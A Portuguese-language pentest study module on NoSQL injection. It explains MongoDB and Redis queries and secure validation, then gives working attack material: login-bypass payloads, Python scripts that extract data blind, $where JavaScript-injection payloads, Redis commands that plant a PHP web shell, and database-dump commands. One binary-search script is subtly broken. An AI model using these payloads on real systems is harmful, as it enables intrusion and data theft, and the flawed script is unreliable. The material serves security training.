---
title: "NoSQL Injection"
---

# NoSQL Injection

# O que é?

Bancos NoSQL (Not Only SQL) são sistemas de gerenciamento de banco de dados que divergem do modelo relacional tradicional. Surgiram para atender demandas de **escala horizontal**, **flexibilidade de schema** e **alta disponibilidade** que RDBMSs tradicionais como PostgreSQL e MySQL tinham dificuldade em satisfazer quando o volume de dados e a taxa de escrita cresceram exponencialmente com a web moderna.

A premissa central de NoSQL é: nem todos os problemas de armazenamento de dados têm a forma de tabelas relacionais com schema fixo. Às vezes os dados são documentos JSON semi-estruturados. Às vezes são pares chave-valor simples com latência sub-milissegundo. Às vezes são grafos de relacionamentos. Cada categoria de banco NoSQL foi otimizada para um desses casos.

Os bancos NoSQL se dividem em quatro categorias principais. **Document stores** como MongoDB e CouchDB armazenam dados como documentos JSON/BSON com campos variáveis por documento — sem schema obrigatório, com queries expressas como objetos JSON e operadores próprios (`$eq`, `$gt`, `$regex`, `$where`). Bancos **Key-Value** como Redis e DynamoDB operam como dicionários com acesso em O(1) por chave; o Redis adiciona estruturas de dados ricas (listas, sets, hashes, sorted sets) enquanto o DynamoDB adiciona queries por partition key e sort key. Os bancos **Column-family** como Cassandra e HBase organizam dados em famílias de colunas com schema flexível por linha — otimizados para séries temporais e analytics, com o Cassandra usando CQL, similar a SQL mas com limitações em joins. **Graph databases** como Neo4j e Amazon Neptune armazenam entidades como nós e relacionamentos como arestas com propriedades, com linguagens de query Cypher (Neo4j) ou SPARQL/Gremlin (Neptune).

**NoSQL Injection** explora a forma como queries são construídas nessas linguagens não-SQL, geralmente baseadas em JSON ou operadores proprietários. O vetor de ataque é análogo ao SQLi clássico: dados do usuário fluem diretamente para o mecanismo de query sem separação adequada entre dados e estrutura de controle. A diferença é que em vez de fechar uma string SQL com `'`, o atacante injeta operadores JSON como `{"$ne": ""}` ou expressões JavaScript em `$where`.

A vulnerabilidade não é uma fraqueza do banco em si — é uma fraqueza de como a aplicação constrói queries usando input externo.

---

# Onde é implementado?

Cada categoria de banco NoSQL domina nichos específicos. Entender onde cada um é usado ajuda a identificar superfícies de ataque em engagements de pentest.

## MongoDB

O banco document-oriented mais adotado do mundo. Usado em:

- **Startups e CMSs modernos**: Strapi (headless CMS), Ghost (blog platform) — schema flexível facilita iteração rápida de produto
- **Perfis de usuário em jogos online**: cada jogador tem um documento com inventário, estatísticas, conquistas — estrutura varia por jogo e personagem
- **Catálogos de produto em e-commerce**: produtos têm atributos diferentes (um tênis tem tamanho, uma TV tem resolução) — schema flexível por categoria
- **IoT e telemetria**: dispositivos enviam leituras com campos variáveis dependendo do sensor
- **Aplicações de conteúdo**: feeds, posts, comentários com metadata variável

Endpoints vulneráveis típicos: `/api/login`, `/api/user`, `/api/search`, qualquer endpoint que aceite JSON e consulte MongoDB.

## Redis

Banco key-value in-memory, usado principalmente como camada auxiliar:

- **Session store**: sessões de usuário armazenadas como hashes Redis (`HSET session:abc123 user_id 42 role admin`)
- **Cache de aplicação**: resultados de queries pesadas cacheados por N segundos
- **Message broker** (pub/sub): canais de comunicação entre microserviços
- **Rate limiting**: contadores de requisição por IP/usuário com TTL
- **Filas de jobs**: Bull e BullMQ (Node.js) usam Redis para gerenciar filas de processamento assíncrono
- **Leaderboards**: sorted sets permitem ranking em tempo real

Exposição direta ao Redis (porta 6379 sem auth) é o vetor — não injection de query, mas acesso irrestrito à API do banco.

## CouchDB

- **Aplicações offline-first**: PouchDB no browser sincroniza com CouchDB no servidor (apps que funcionam sem internet)
- **Documentos com attachments**: arquivos binários associados a documentos
- **APIs REST nativas**: CouchDB expõe HTTP REST diretamente — cada banco é um endpoint, cada documento é um resource

Exposição: porta 5984 acessível publicamente com auth desabilitada. Interface Fauxton (admin UI) em `/_utils`.

## DynamoDB

- **Backends serverless AWS**: Lambda functions com DynamoDB como armazenamento — sem servidor para gerenciar
- **Aplicações de alta escala**: throughput provisionado ou on-demand, escala horizontal automática
- **Session store em arquiteturas AWS**: alternativa ao Redis gerenciado (ElastiCache) com durabilidade garantida

Vetor de ataque: geralmente via misconfigurações IAM, não injection de query (DynamoDB usa SDK com queries tipadas).

## Cassandra

- **Time-series data**: métricas, logs, eventos com timestamp — modelo de dados otimizado para séries temporais
- **Analytics em larga escala**: Netflix, Instagram usam Cassandra para bilhões de eventos
- **Sistemas de recomendação**: armazenamento de histórico de interações de usuário

Cassandra usa CQL (Cassandra Query Language), similar a SQL. Injection em CQL existe mas é menos comum que em MongoDB.

---

# Como funciona de forma adequada?

Para entender NoSQL Injection, é essencial compreender como cada banco constrói e executa queries de forma legítima — e onde a fronteira entre dados e controle colapsa quando mal implementado.

## SQL vs MongoDB: a mesma intenção, linguagens diferentes

```
Objetivo: autenticar usuario com email e senha

SQL (PostgreSQL/MySQL):
  SELECT * FROM users
  WHERE email = 'alice@corp.com'
    AND password = 'hashed_value';

MongoDB:
  db.users.find({
    email: "alice@corp.com",
    password: "hashed_value"
  })

Diferenca fundamental:
  SQL: a query e uma STRING que o banco parseia
  MongoDB: a query e um OBJETO que o banco recebe diretamente

Em SQL, o atacante tenta escapar da string: ' OR '1'='1
Em MongoDB, o atacante tenta injetar um OBJETO no lugar de um VALOR:
  { "$ne": "" }  →  retorna documentos onde campo != ""
```

## Como os operadores MongoDB funcionam corretamente

```javascript
// $eq — igual a (implícito quando se passa valor direto)
db.users.find({ email: { $eq: "alice@corp.com" } })
// equivale a:
db.users.find({ email: "alice@corp.com" })

// $ne — diferente de
db.users.find({ status: { $ne: "banned" } })
// retorna usuários que não estão banidos

// $gt / $lt — maior/menor que (numérico E string)
db.products.find({ price: { $gt: 100, $lt: 500 } })
// produtos entre R$100 e R$500

// $regex — expressão regular
db.users.find({ email: { $regex: "@corp\\.com$" } })
// emails corporativos

// $in — valor está numa lista
db.users.find({ role: { $in: ["admin", "moderator"] } })

// $where — PERIGOSO: executa JavaScript no servidor
// Usado para lógica complexa que operadores não suportam
db.users.find({ $where: "this.score > this.threshold" })
// 'this' referencia o documento atual
// $where aceita string JavaScript arbitrária → vetor de SSJI
```

## Como Redis SET/GET/HSET funcionam

```
Operacoes basicas Redis — comportamento normal:

  SET session:abc123 '{"user_id": 42, "role": "user"}'
  GET session:abc123
  → '{"user_id": 42, "role": "user"}'

  HSET user:42 name "Alice" email "alice@corp.com" role "user"
  HGET user:42 role
  → "user"
  HGETALL user:42
  → { name: "Alice", email: "alice@corp.com", role: "user" }

  KEYS *           → lista todas as chaves (PERIGOSO em prod)
  KEYS session:*   → filtra por prefixo

Sem autenticacao (requirepass nao configurado):
  Qualquer cliente na rede pode executar qualquer comando
  CONFIG SET, BGSAVE, EVAL (Lua) → vetores de escalada
```

## Código Node.js + Mongoose correto: parâmetros tipados

```javascript
const mongoose = require('mongoose');
const express  = require('express');
const app      = express();
app.use(express.json());

// Schema Mongoose com tipos definidos
// Mongoose valida tipos ANTES de enviar ao MongoDB
const UserSchema = new mongoose.Schema({
    email:    { type: String, required: true, lowercase: true, trim: true },
    password: { type: String, required: true },
    role:     { type: String, enum: ['user', 'admin'], default: 'user' },
    active:   { type: Boolean, default: true }
});

const User = mongoose.model('User', UserSchema);

// Endpoint de login CORRETO
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;

    // Validacao de tipo ANTES de qualquer query
    if (typeof email !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'Tipos de entrada invalidos' });
    }

    // Sanitizacao adicional: rejeitar se parecer objeto
    if (email.includes('$') || password.includes('$')) {
        return res.status(400).json({ error: 'Caracteres invalidos' });
    }

    try {
        // Mongoose converte 'email' para String via schema
        // Se req.body.email for { $ne: "" }, Mongoose rejeita (type mismatch)
        const user = await User.findOne({
            email: email,       // String — Mongoose nao aceita objeto aqui
            password: password  // String — idem
        });

        if (!user) {
            return res.status(401).json({ error: 'Credenciais invalidas' });
        }

        res.json({ token: generateToken(user), role: user.role });
    } catch (err) {
        res.status(500).json({ error: 'Erro interno' });
    }
});
```

## Por que NoSQL elimina SQLi mas introduz seus próprios vetores

```
SQL Injection:
  Vetor: concatenacao de strings → atacante fecha string e injeta SQL
  Exemplo: "SELECT * FROM users WHERE email='" + email + "'"
  Payload: ' OR '1'='1

NoSQL Injection (MongoDB):
  Vetor: objeto JavaScript usado como query sem validacao de tipo
  Exemplo: db.users.find({ email: req.body.email })
  Payload: { "$ne": "" }  →  req.body.email = {"$ne": ""}

NoSQL elimina SQLi porque:
  - Nao ha strings de query para "escapar" ou "fechar"
  - Queries sao objetos, nao strings concatenadas

NoSQL introduz seus proprios vetores porque:
  - Operadores ($ne, $regex, $where) sao parte do mesmo
    objeto que carrega os dados
  - Se o atacante controla o OBJETO, controla os OPERADORES
  - $where executa JavaScript arbitrario no servidor MongoDB
```

## Como Mongoose schema validation previne injection

```javascript
// Schema rigoroso com validacao customizada
const LoginSchema = new mongoose.Schema({
    email: {
        type: String,
        required: true,
        validate: {
            validator: (v) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v),
            message: 'Email invalido'
        }
    },
    password: {
        type: String,
        required: true,
        minlength: 8
    }
});

// Se req.body.email for {"$ne": ""}:
// Mongoose tenta coerce para String → "[object Object]"
// Ou lanca erro de validacao se validator rejeitar

// Protecao adicional: mongo-sanitize
const sanitize = require('mongo-sanitize');
// sanitize({ "$ne": "" }) → {}  (remove chaves com $)
// sanitize({ email: { "$ne": "" } }) → { email: {} }

app.post('/login', async (req, res) => {
    const cleanBody = sanitize(req.body);  // remove operadores $
    const user = await User.findOne({
        email: cleanBody.email,
        password: cleanBody.password
    });
    // ...
});
```

## Parameterized queries equivalentes em MongoDB

```javascript
// Em SQL, parameterized queries separam codigo de dados:
// SELECT * FROM users WHERE email = $1  →  ['alice@corp.com']

// Em MongoDB, o equivalente e passar objeto TIPADO (nao concatenado):

// INSEGURO — concatenacao equivalente:
const query = `{ "email": "${req.body.email}" }`;  // string → eval → PERIGO
db.collection.find(JSON.parse(query));

// SEGURO — objeto com tipo garantido:
const email = String(req.body.email);  // forca para String
db.users.find({ email: email });       // objeto tipado, nao string

// MAIS SEGURO — com Mongoose (schema enforces types):
await User.findOne({ email: req.body.email });
// Mongoose coerce req.body.email para String via schema
// Se for objeto, ou converte para "[object Object]" (inofensivo)
// ou rejeita com erro de validacao

// AINDA MAIS SEGURO — validar com Joi/Zod antes:
const Joi = require('joi');
const schema = Joi.object({
    email:    Joi.string().email().required(),
    password: Joi.string().min(8).required()
});
const { error, value } = schema.validate(req.body);
if (error) return res.status(400).json({ error: error.details[0].message });
// value.email e value.password sao strings validadas — seguros para query
```

---

# A Falha: Operadores de Query Tratados como Dados em Bancos NoSQL

NoSQL Injection existe por uma razão que difere estruturalmente da SQLi clássica: em bancos como MongoDB, os dados e os operadores de query são representados no mesmo formato — objetos JSON/BSON. Quando a aplicação aceita input do usuário e o usa diretamente como valor numa query, um atacante pode enviar não uma string, mas um objeto JSON contendo operadores como `{"$ne": ""}` ou `{"$regex": ".*"}`. O banco de dados interpreta isso como instruções de query, não como dados.

A suposição de design errada é específica de bancos document-oriented: o desenvolvedor escreve `db.users.find({username: req.body.username})` esperando que `username` seja uma string como `"admin"`. O que não foi previsto é que `req.body.username` pode ser o objeto `{"$ne": ""}` — e o MongoDB vai interpretar esse objeto como o operador "diferente de vazio", retornando todos os documentos onde username não é uma string vazia. Isso é autenticação bypassada sem conhecer nenhuma credencial.

O desenvolvedor cria essa falha sem perceber porque durante o desenvolvimento o input vem de formulários HTML, que sempre enviam strings. Somente quando o atacante envia `Content-Type: application/json` com um body estruturado como objeto é que a diferença aparece. Frameworks como Express.js com `bodyParser.json()` desserializam automaticamente o JSON do body em objetos JavaScript — incluindo objetos aninhados com operadores MongoDB. O desenvolvedor que não valida o tipo do input antes de usá-lo na query está exposto.

A consequência real antes de ver a exploração: a ausência de separação entre dados e operadores significa que qualquer parâmetro de query que aceite input externo pode se tornar um mecanismo de busca arbitrária no banco. Bypass de autenticação, enumeração de registros, extração de dados campo a campo via regex — tudo é possível via operadores injetados.

---

## Causa Raiz

O código vulnerável passa o input do usuário diretamente como valor de query, sem validar que é do tipo esperado:

```javascript
// VULNERÁVEL — input não tem tipo garantido
app.post('/api/v1/getUser', (req, res) => {
    client.connect(function(_, con) {
        const cursor = con
            .db("example")
            .collection("users")
            .find({username: req.body['username']});  // body pode conter operador!
        cursor.toArray(function(_, result) {
            res.send(result);
        });
    });
});
```

O que está faltando é validação do tipo do input antes de usá-lo na query. O padrão correto:

```javascript
// SEGURO — tipo do input é verificado antes de usar
app.post('/api/v1/getUser', (req, res) => {
    const username = req.body['username'];
    
    // Garantir que username é string, não objeto com operador
    if (typeof username !== 'string') {
        return res.status(400).json({error: 'Invalid input'});
    }
    
    const cursor = con.db("example").collection("users")
        .find({username: username});
    // ...
});
```

O problema é análogo ao SQLi: dados do usuário fluindo diretamente para o mecanismo de query sem passar por uma camada de validação que separe dados confiáveis de estruturas de controle. Em PHP, o mesmo ocorre porque arrays associativos PHP podem ser enviados via form URL encoding usando a notação `username[$ne]=test`.

---

## Estrutura de Bancos NoSQL e Superfície de Ataque

### Tipos de Banco de Dados NoSQL

| Tipo | Descrição | Exemplos |
|------|-----------|---------|
| Document-Oriented | Armazena dados em documentos JSON/XML com fields e values | MongoDB, DynamoDB, Firebase |
| Key-Value | Estrutura de dicionário com pares key:value | Redis, DynamoDB, Azure Cosmos DB |
| Wide-Column Store | Tabelas, linhas e colunas como banco relacional mas com tipos ambíguos | Apache Cassandra, HBase |
| Graph Database | Armazena dados em nós com edges definindo relacionamentos | Neo4j, Azure Cosmos DB |

### MongoDB: Conceitos Fundamentais

MongoDB é um banco **document-oriented**. Dados são armazenados em **collections** (equivalente a tabelas) compostas de **documents** (equivalente a linhas) encodados em **BSON** (Binary JSON).

```javascript
// Documento de exemplo
{
  _id: ObjectId("63651456d18bf6c01b8eeae9"),
  type: 'Granny Smith',
  price: 0.65
}
```

#### Conectando ao MongoDB

```bash
mongosh mongodb://127.0.0.1:27017
```

MongoDB escuta na porta padrão **27017/tcp**.

#### Operações básicas no mongosh

```javascript
// Listar databases
show databases

// Trocar para um database
use academy

// Listar collections
show collections

// Inserir um documento
db.apples.insertOne({type: "Granny Smith", price: 0.65})

// Inserir múltiplos documentos
db.apples.insertMany([{type: "Golden Delicious", price: 0.79}, {type: "Pink Lady", price: 0.90}])

// Buscar documentos
db.apples.find({type: "Granny Smith"})

// Buscar todos
db.apples.find({})

// Atualizar
db.apples.updateOne({type: "Granny Smith"}, {$set: {price: 1.99}})

// Remover
db.apples.remove({price: {$lt: 0.80}})
```

### Operadores de Query MongoDB

Esses operadores são o coração da NoSQL Injection em MongoDB:

| Tipo | Operador | Descrição | Exemplo |
|------|----------|-----------|---------|
| Comparison | `$eq` | Igual a | `{type: {$eq: "Pink Lady"}}` |
| Comparison | `$gt` | Maior que | `{price: {$gt: 0.30}}` |
| Comparison | `$gte` | Maior ou igual | `{price: {$gte: 0.50}}` |
| Comparison | `$in` | Existe no array | `{type: {$in: ["Granny Smith", "Pink Lady"]}}` |
| Comparison | `$lt` | Menor que | `{price: {$lt: 0.60}}` |
| Comparison | `$lte` | Menor ou igual | `{price: {$lte: 0.75}}` |
| Comparison | `$ne` | Diferente de | `{type: {$ne: "Granny Smith"}}` |
| Comparison | `$nin` | Não está no array | `{type: {$nin: ["Golden Delicious", "Granny Smith"]}}` |
| Logical | `$and` | E lógico | `{$and: [{type: 'Granny Smith'}, {price: 0.65}]}` |
| Logical | `$not` | Não lógico | `{type: {$not: {$eq: "Granny Smith"}}}` |
| Logical | `$nor` | NOR lógico | `{$nor: [{type: 'Granny Smith'}, {price: 0.79}]}` |
| Logical | `$or` | OU lógico | `{$or: [{type: 'Granny Smith'}, {price: 0.79}]}` |
| Evaluation | `$regex` | Corresponde ao RegEx | `{type: {$regex: /^G.*/}}` |
| Evaluation | `$where` | Executa JavaScript | `{$where: 'this.type.length === 9'}` |
| Evaluation | `$mod` | Módulo aritmético | `{price: {$mod: [4, 0]}}` |

---

## Discovery

### Identificando NoSQL por Stack Traces

Mensagens de erro revelam o banco em uso:

```
MongoServerError: unknown operator: $foo
CouchDB error: {"error":"bad_request"}
Redis error: ERR unknown command
```

### Fuzzing com Wfuzz

```bash
# Usando a wordlist de NoSQL do SecLists
wfuzz -z file,/usr/share/seclists/Fuzzing/Databases/NoSQL.txt \
      -u http://127.0.0.1/index.php \
      -d '{"trackingNum": "FUZZ"}'

# Outra wordlist específica
wfuzz -z file,nosqlinjection_wordlists/mongodb_nosqli.txt \
      -u http://TARGET/api/user \
      -d '{"username": "FUZZ"}'
```

Analise respostas com **tamanho diferente** (chars/words) - essas indicam injeção bem-sucedida.

### Teste Manual com Burp Repeater

```
# Para parâmetros URL-encoded (PHP/Express)
username[$ne]=test
username[$gt]=
username[$regex]=.*

# Para JSON body
{"username": {"$ne": ""}}
{"username": {"$regex": ".*"}}
{"username": {"$gt": ""}}
```

---

## Exploitation

### 1. Authentication Bypass

#### Cenário: Login com URL-encoded (PHP)

O server executa:
```php
$query = new MongoDB\Driver\Query(array(
    "email" => $_POST['email'],
    "password" => $_POST['password']
));
```

**Bypass com $ne:**
```
email[$ne]=nonexistent@test.com&password[$ne]=nonexistent
```

Isso transforma a query em:
```javascript
db.users.find({
    email: {$ne: "nonexistent@test.com"},
    password: {$ne: "nonexistent"}
})
```

**Bypass com $regex:**
```
email[$regex]=.*&password[$regex]=.*
```

**Bypass com $gt (string maior que vazio):**
```
email[$gt]=&password[$gt]=
```

**Bypass com $gte:**
```
email[$gte]=&password[$gte]=
```

#### Cenário: Login com JSON body

```bash
# $ne bypass
curl -s -X POST http://TARGET/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# $regex bypass
curl -s -X POST http://TARGET/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# $gt bypass (strings são maiores que string vazia)
curl -s -X POST http://TARGET/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Se souber o email do admin
curl -s -X POST http://TARGET/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin@target.com", "password": {"$ne": "x"}}'
```

### 2. In-Band Data Extraction

Quando o server retorna dados diretamente na resposta:

```bash
# Retorna TODOS os usuários (username começa com qualquer coisa)
curl -s -X POST http://127.0.0.1:3000/api/v1/getUser \
  -H 'Content-Type: application/json' \
  -d '{"username": {"$regex": ".*"}}' | jq

# Alternativas equivalentes
# name: {$ne: 'doesntExist'}   -> corresponde a todos
# name: {$gt: ''}              -> maior que string vazia = todos
# name: {$lt: '~'}             -> ~ é o maior char ASCII imprimível
```

### 3. Blind Data Extraction com $regex

Quando o server não retorna dados diretamente mas indica true/false (ex: encontrou ou não encontrou um pacote):

**Exfiltração caractere por caractere:**

```bash
# Verifica se trackingNum começa com '3'
curl -s -X POST http://TARGET/index.php \
  -H 'Content-Type: application/json' \
  -d '{"trackingNum": {"$regex": "^3.*"}}'

# Verifica segundo dígito
curl -s -X POST http://TARGET/index.php \
  -H 'Content-Type: application/json' \
  -d '{"trackingNum": {"$regex": "^32.*"}}'

# Verifica string completa e testa fim ($)
curl -s -X POST http://TARGET/index.php \
  -H 'Content-Type: application/json' \
  -d '{"trackingNum": {"$regex": "^32A766AB$"}}'
```

**Script Python para automação de blind injection:**

```python
#!/usr/bin/python3
import requests
import json

# Oracle - retorna True se a query matchou o pacote alvo
def oracle(t):
    r = requests.post(
        "http://127.0.0.1/index.php",
        headers={"Content-Type": "application/json"},
        data=json.dumps({"trackingNum": t})
    )
    return "Franz Pflaumenbaum" in r.text  # string que indica match

# Verificar oracle
assert (oracle("X") == False)
assert (oracle({"$regex": "HTB{.*"}) == True)

# Dump do tracking number (formato HTB{[0-9a-f]{32}})
trackingNum = "HTB{"
for _ in range(32):
    for c in "0123456789abcdef":
        if oracle({"$regex": "^" + trackingNum + c}):
            trackingNum += c
            break

trackingNum += "}"
assert (oracle(trackingNum) == True)
print("Tracking Number: " + trackingNum)
```

**Versão com binary search (muito mais eficiente - 286 requests vs 1678):**

```python
#!/usr/bin/python3
import requests
import json

def oracle(t):
    r = requests.post(
        "http://127.0.0.1/index.php",
        headers={"Content-Type": "application/json"},
        data=json.dumps({"trackingNum": t})
    )
    return "bmdyy" in r.text

trackingNum = "HTB{"
i = 4
while trackingNum[-1] != "}":
    low = 32   # ASCII ' ' (space)
    high = 127 # ASCII '~'
    mid = 0
    while low <= high:
        mid = (high + low) // 2
        if oracle({'$regex': 'this.username.startsWith("HTB{") && this.username.charCodeAt(%d) > %d' % (i, mid)}):
            low = mid + 1
        elif oracle({'$regex': 'this.username.startsWith("HTB{") && this.username.charCodeAt(%d) < %d' % (i, mid)}):
            high = mid - 1
        else:
            trackingNum += chr(mid)
            break
    i += 1

print("Tracking Number:", trackingNum)
```

### 4. Server-Side JavaScript Injection (SSJI) com $where

O operador `$where` executa JavaScript no contexto do banco de dados, permitindo ataques mais poderosos:

**Código vulnerável:**
```javascript
.find({$where: 'this.username == "' + req.body['username'] + '" && this.password == "' + req.body['password'] + '"'});
```

**Payloads de bypass de autenticação via SSJI:**
```
# URL-encoded
username=" || true || ""=="&password=x

# JSON
{"username": "\" || true || \"\"==\"", "password": "x"}
```

A query resultante avalia sempre como `true`:
```javascript
db.users.find({$where: 'this.username == "" || true || ""=="" && this.password == "x"'})
```

**Time-based blind injection com $where:**
```javascript
// Causa delay de 5 segundos se verdadeiro
{"$where": "sleep(5000)"}

// Delay condicional para exfiltrar dados
{"$where": "if(this.username.startsWith('a')) { sleep(5000); return true; } return false;"}
```

**Exfiltração via SSJI com match():**
```
# Verifica se username começa com qualquer coisa (sanity check)
username=" || (this.username.match('^.*')) || ""=="

# Verifica primeiro caractere
username=" || (this.username.match('^H.*')) || ""=="

# Verifica dois caracteres
username=" || (this.username.match('^HT.*')) || ""=="
```

**Script Python para SSJI blind:**
```python
#!/usr/bin/python3
import requests
from urllib.parse import quote_plus

num_req = 0

def oracle(r):
    global num_req
    num_req += 1
    response = requests.post(
        "http://127.0.0.1/index.php",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data="username=%s&password=x" % (quote_plus('" || (' + r + ') || ""=="'))
    )
    return "Logged in as" in response.text

# Verificar oracle
assert (oracle('false') == False)
assert (oracle('true') == True)

# Dump usando binary search (printable ASCII 32-127)
username = "HTB{"
i = 4
while username[-1] != "}":
    low = 32
    high = 127
    mid = 0
    while low <= high:
        mid = (high + low) // 2
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) > %d' % (i, mid)):
            low = mid + 1
        elif oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) < %d' % (i, mid)):
            high = mid - 1
        else:
            username += chr(mid)
            break
    i += 1

print("Username:", username)
print("Requests:", num_req)
```

### 5. PHP Type Juggling com NoSQL

PHP usa comparação fraca (`==`) por padrão, o que pode ser explorado:

```php
// Código vulnerável
if ($user['password'] == $_POST['password']) { ... }
```

```bash
# Array vazio tem hash nulo em alguns contextos
curl -d 'password[]=' http://TARGET/login

# Comparação fraca: "0" == false == null em PHP
curl -d 'password=0' http://TARGET/login
```

---

## Ferramentas

### NoSQLMap

Ferramenta de código aberto em Python 2 para identificar e explorar NoSQL injection:

```bash
# Instalação
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
sudo apt install python2.7
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
pip2 install couchdb pymongo ipcalc pbkdf2 --upgrade setuptools

# Uso básico - Web Attack (POST)
python2 nosqlmap.py \
  --attack 2 \
  --victim 127.0.0.1 \
  --webPort 80 \
  --uri /index.php \
  --httpMethod POST \
  --postData email,admin@target.com,password,qwerty \
  --injectedParameter 1 \
  --injectSize 4

# Argumentos principais
# --attack 2          Web App attack
# --victim IP         IP do alvo
# --webPort PORT      Porta HTTP
# --uri /path         Endpoint
# --httpMethod POST   Método HTTP
# --postData a,va,b,vb  Parâmetros e valores padrão
# --injectedParameter 1  Qual parâmetro injetar (1-indexed)
# --injectSize 4      Tamanho para dados gerados aleatoriamente
```

### wfuzz (Fuzzing)

```bash
# Fuzzing com wordlist SecLists
wfuzz -z file,/usr/share/seclists/Fuzzing/Databases/NoSQL.txt \
      -u http://127.0.0.1/index.php \
      -d '{"trackingNum": "FUZZ"}'

# Procurar respostas com tamanho diferente (indicam injeção)
# Resposta padrão: 35 chars
# Resposta anômala: 136 chars → {"$gt": ""} causou comportamento diferente
```

### Burp Suite + Burp-NoSQLiScanner

Extension para Burp Suite Professional que escaneia automaticamente NoSQL injection. Disponível no BApp Store.

---

## CouchDB: HTTP API Abuse

CouchDB expõe uma API HTTP REST que pode ser abusada se acessível:

```bash
# Listar todos os databases
curl http://TARGET:5984/_all_dbs

# Interface Fauxton (admin UI)
http://TARGET:5984/_utils

# Listar documentos de um database
curl http://TARGET:5984/DATABASE/_all_docs

# Obter um documento específico
curl http://TARGET:5984/DATABASE/DOCUMENT_ID

# Criar um documento (se autenticado ou mal configurado)
curl -X PUT http://TARGET:5984/DATABASE/new_doc \
  -H 'Content-Type: application/json' \
  -d '{"key": "value"}'
```

---

## Redis: Exploração via CLI

Redis é um banco key-value que expõe uma interface de linha de comando:

```bash
# Conectar ao Redis
redis-cli -h TARGET -p 6379

# Listar todas as chaves
KEYS *

# Obter valor de uma chave
GET session:admin
GET config:secret

# Definir um valor
SET mykey "myvalue"

# Configurar diretório de dump (possível write arbitrary file)
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET shell "<?php system($_GET['cmd']); ?>"
BGSAVE

# Execução Lua (RCE em versões antigas)
EVAL "return redis.call('set','foo','bar')" 0

# Time-based: sleep para detecção blind
EVAL "local t=redis.call('time') while(redis.call('time')[1]-t[1]<5) do end return 1" 0
```

---

## Detecção e Mitigação

### Sinais de NoSQL Injection

1. **Mensagens de erro** revelando MongoDB, CouchDB ou Redis stack traces
2. **Comportamento inesperado** ao enviar `[$ne]`, `[$gt]`, `[$regex]` em parâmetros
3. **Resposta diferente** ao enviar `{"$gt": ""}` vs string normal (detectado por wfuzz)
4. **Login bypass** com operadores de comparação
5. **Delay de resposta** com `{"$where": "sleep(5000)"}` indica SSJI

### Como Prevenir

```javascript
// Node.js - validar tipo do input
app.post('/login', (req, res) => {
    // Garantir que username é string, não objeto
    const username = String(req.body.username);
    const password = String(req.body.password);
    
    db.users.find({username: username, password: password});
});

// PHP - cast explícito
$username = (string) $_POST['email'];
$password = (string) $_POST['password'];

// Usar schema validation no MongoDB
db.createCollection("users", {
    validator: {
        $jsonSchema: {
            bsonType: "object",
            required: ["email", "password"],
            properties: {
                email: {bsonType: "string"},
                password: {bsonType: "string"}
            }
        }
    }
})
```

### Extração de Dados Pós-Comprometimento

Após obter acesso ao servidor:

```bash
# mongodump - exporta database inteiro em formato BSON
mongodump --host 127.0.0.1 --port 27017 --db DATABASE_NAME --out /tmp/dump

# mongoexport - exporta collection em JSON/CSV
mongoexport --host 127.0.0.1 --port 27017 \
            --db DATABASE_NAME \
            --collection COLLECTION_NAME \
            --out /tmp/collection.json

# Acessar diretamente via mongosh
mongosh mongodb://127.0.0.1:27017
> use DATABASE_NAME
> db.users.find().pretty()
> db.users.find({}, {password: 1, _id: 0})  // só senhas
```

---

## Resumo dos Payloads

```bash
# ===== AUTHENTICATION BYPASS =====

# URL-encoded (PHP/Express com parâmetros de form)
username[$ne]=x&password[$ne]=x
username[$regex]=.*&password[$regex]=.*
username[$gt]=&password[$gt]=
email[$ne]=test%40test.com&password[$ne]=test

# JSON body
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# SSJI (Server-Side JavaScript Injection)
username=" || true || ""=="
username=" || (this.username.match('^.*')) || ""=="

# ===== BLIND DATA EXTRACTION =====

# Verifica se campo começa com 'a'
{"field": {"$regex": "^a.*"}}

# Regex URL-encoded
field[$regex]=^a.*

# SSJI blind
username=" || (this.username.match('^a.*')) || ""=="

# ===== TIME-BASED BLIND =====

# sleep via $where
{"$where": "sleep(5000)"}

# Condicional time-based
{"$where": "if(this.password[0]=='a') { sleep(5000); }"}

# ===== SSJI PAYLOADS =====
" || true || ""=="
" || 1==1 || ""=="
'; return true; var dummy='
1; return db.a.find(); var dummy=1
"a"; return db.a.findOne(); var dummy="a
```

---

## Módulos Relacionados

A raiz da NoSQL injection é a mesma da SQL injection clássica — input do usuário fluindo diretamente para o mecanismo de query sem separação entre dados e estrutura de controle; a comparação completa e os fundamentos estão em [`01_sqli_fundamentos.md`](../03_sqli/01_sqli_fundamentos.md). Os algoritmos de extração blind por booleano e por tempo descritos em [`02_sqli_blind_e_avancado.md`](../03_sqli/02_sqli_blind_e_avancado.md) são diretamente aplicáveis a injeções NoSQL quando a resposta não retorna dados diretamente.
